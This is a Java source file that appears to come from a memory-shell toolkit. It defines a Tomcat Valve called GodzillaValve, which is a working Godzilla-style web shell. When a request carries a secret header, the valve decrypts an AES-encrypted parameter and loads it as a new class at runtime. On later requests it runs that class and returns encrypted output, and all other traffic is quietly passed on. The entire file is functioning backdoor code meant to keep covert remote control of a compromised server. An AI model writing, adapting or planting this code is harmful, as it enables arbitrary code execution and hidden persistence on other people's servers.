package com.reajason.javaweb.memshell.shelltool.godzilla;

import org.apache.catalina.Valve;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.ServletException;
import javax.servlet.http.HttpSession;
import java.io.ByteArrayOutputStream;
import java.io.IOException;

/**
 * @author ReaJason
 */
public class GodzillaValve extends ClassLoader implements Valve {
    public static String key;
    public static String pass;
    public static String md5;
    public static String headerName;
    public static String headerValue;

    public GodzillaValve() {
    }

    public GodzillaValve(ClassLoader z) {
        super(z);
    }

    @Override
    @SuppressWarnings("all")
    public void invoke(Request request, Response response) throws IOException, ServletException {
        try {
            if (request.getHeader(headerName) != null && request.getHeader(headerName).contains(headerValue)) {
                HttpSession session = request.getSession();
                byte[] data = base64Decode(request.getParameter(pass));
                data = this.x(data, false);
                Object cache = session.getAttribute(key);
                if (cache == null) {
                    session.setAttribute(key, (new GodzillaValve(Thread.currentThread().getContextClassLoader())).Q(data));
                } else {
                    ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
                    Object f = ((Class) cache).newInstance();
                    f.equals(arrOut);
                    f.equals(request);
                    f.equals(data);
                    f.toString();
                    response.getWriter().write(md5.substring(0, 16));
                    response.getWriter().write(base64Encode(this.x(arrOut.toByteArray(), true)));
                    response.getWriter().write(md5.substring(16));
                    response.flushBuffer();
                }
                return;
            }
        } catch (Throwable e) {
            e.printStackTrace();
        }
        this.getNext().invoke(request, response);
    }

    @SuppressWarnings("all")
    public static String base64Encode(byte[] bs) throws Exception {
        String value = null;
        Class<?> base64;
        try {
            base64 = Class.forName("java.util.Base64");
            Object encoder = base64.getMethod("getEncoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
            value = (String) encoder.getClass().getMethod("encodeToString", byte[].class).invoke(encoder, bs);
        } catch (Exception var6) {
            base64 = Class.forName("sun.misc.BASE64Encoder");
            Object encoder = base64.newInstance();
            value = (String) encoder.getClass().getMethod("encode", byte[].class).invoke(encoder, bs);
        }
        return value;
    }

    @SuppressWarnings("all")
    public static byte[] base64Decode(String bs) throws Exception {
        byte[] value = null;
        Class<?> base64;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
            value = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
        } catch (Exception var6) {
            base64 = Class.forName("sun.misc.BASE64Decoder");
            Object decoder = base64.newInstance();
            value = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
        }
        return value;
    }

    @SuppressWarnings("all")
    public Class Q(byte[] cb) {
        return super.defineClass(cb, 0, cb.length);
    }

    public byte[] x(byte[] s, boolean m) {
        try {
            Cipher c = Cipher.getInstance("AES");
            c.init(m ? 1 : 2, new SecretKeySpec(key.getBytes(), "AES"));
            return c.doFinal(s);
        } catch (Exception var4) {
            return null;
        }
    }

    protected Valve next;
    protected boolean asyncSupported;

    @Override
    public Valve getNext() {
        return this.next;
    }

    @Override
    public void setNext(Valve valve) {
        this.next = valve;
    }

    @Override
    public boolean isAsyncSupported() {
        return this.asyncSupported;
    }

    @Override
    public void backgroundProcess() {
    }
}